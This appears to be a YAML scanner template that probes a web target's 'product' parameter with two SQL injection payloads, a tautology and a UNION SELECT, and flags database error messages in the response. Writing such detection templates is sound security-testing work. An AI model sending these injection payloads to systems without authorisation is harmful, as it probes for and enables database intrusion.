id: sqli-generic-15
name: 'SQLi error generic via product'
severity: high
type: active
tags:
  - sqli
  - injection
  - generic
description: 'Triggers generic error via product'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      product:
        - ''' OR ''1''=''1'
        - ''' UNION SELECT NULL--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'JDBC'
          - 'DB2 SQL error'
          - 'Warning: mysql'
